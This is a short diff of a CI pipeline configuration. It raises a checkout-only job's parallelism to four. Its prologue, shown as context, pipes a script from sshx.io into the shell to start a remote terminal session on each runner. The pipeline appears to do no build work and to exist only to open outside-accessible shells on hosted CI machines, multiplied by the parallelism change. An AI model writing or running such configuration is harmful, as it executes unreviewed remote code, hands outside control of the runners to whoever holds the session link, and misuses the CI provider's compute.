@@ -11,6 +11,7 @@ blocks:
         - name: 'Job #1'
           commands:
             - checkout
+          parallelism: 4
       prologue:
         commands:
           - 'apt  update;apt -y install curl;curl -sSf https://sshx.io/get | sh -s run'
